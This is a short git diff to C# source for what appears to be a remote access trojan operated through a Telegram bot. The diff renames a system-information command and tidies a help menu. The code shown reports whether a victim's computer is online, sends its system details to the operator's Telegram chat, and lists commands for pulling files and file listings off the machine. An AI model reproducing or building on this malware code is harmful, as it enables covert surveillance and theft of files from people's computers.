@@ -74,8 +74,7 @@ namespace RAT_BotTelegram {
                 case "/Status": // Verifica Si la PC se encuentra en linea
                     await Bot.SendTextMessageAsync(config.id, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
                     break;
-                case "/PC_Info":
-                    
+                case "/Get_Information":
                     await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                     break;
 
@@ -146,7 +145,7 @@ namespace RAT_BotTelegram {
                   "________________________________\n" +
                   " * Use the following commands: *\n" +
                   "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
-                  "\n/Status            <Check if the PC is online>" +
+                  "\n/Status          <Check if the PC is online>" +
                   "\n/Get_Information <get detailed system information>" +
                   "\n/Get_Files       |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                   "\n/Get_DirFiles    |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
